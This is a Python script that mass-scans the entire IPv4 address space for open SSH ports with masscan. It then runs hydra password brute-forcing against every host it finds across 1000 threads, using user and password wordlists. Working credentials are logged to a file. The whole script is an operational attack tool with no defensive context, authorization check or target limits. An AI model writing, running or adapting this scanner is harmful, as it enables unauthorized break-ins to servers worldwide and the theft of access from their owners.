import os
import queue
import threading
import subprocess
import time

# Files
UFILE = "users.txt"
PFILE = "passes.txt"
LOGS = "valid_creds.txt"
ELOGS = "error_log.txt"

# Settings
RATE = "20000"
WORKERS = 1000
PORT = 22
RANGE = "0.0.0.0/0"
BATCH = "50000"

q = queue.Queue()
stats = {"scan": 0, "hits": 0, "fails": 0, "errors": 0}

def save_hit(creds):
    with open(LOGS, "a") as f:
        f.write(f"{creds}\n")
    stats["hits"] += 1

def save_err(err):
    with open(ELOGS, "a") as f:
        f.write(f"{err}\n")
    stats["errors"] += 1

def brute(ip):
    print(f"[+] Hydra -> {ip}")
    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 128 -T 5 -W 1 -V 2>&1"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

    found = False
    for line in res.split("\n"):
        if "password:" in line:
            print(f"[✔] {line}")
            save_hit(line)
            found = True
        elif "failed" in line.lower() or "invalid" in line.lower():
            stats["fails"] += 1
        elif "error" in line.lower():
            save_err(line)

    if not found:
        stats["fails"] += 1

def worker():
    while True:
        ip = q.get()
        if ip is None:
            break
        print(f"[+] Worker -> {ip}")
        brute(ip)
        q.task_done()

def scan():
    print("[*] Scanning...")
    last = "0.0.0.0"

    while True:
        json_file = "masscan.json"
        cmd = f"masscan -p{PORT} --open --rate={RATE} --range {last} --batch {BATCH} --exclude 255.255.255.255 --output-format=json --output-filename={json_file}"
        print(f"[DEBUG] {cmd}")
        subprocess.run(cmd, shell=True)

        if os.path.exists(json_file):
            with open(json_file, "r") as f:
                for line in f:
                    if '"ip":' in line:
                        ip = line.split('"ip": "')[1].split('"')[0]
                        stats["scan"] += 1
                        print(f"[*] Found {ip} (Scan: {stats['scan']})")
                        q.put(ip)

            os.remove(json_file)

        time.sleep(1)

def start_workers():
    threads = []
    for _ in range(WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

def show_stats():
    while True:
        time.sleep(5)
        print(f"[STATS] Scanned: {stats['scan']} | Hits: {stats['hits']} | Fails: {stats['fails']} | Errors: {stats['errors']}")

def run():
    print("[*] Running...")
    start_workers()
    threading.Thread(target=scan, daemon=True).start()
    threading.Thread(target=show_stats, daemon=True).start()

    while True:
        time.sleep(5)

if __name__ == "__main__":
    run()
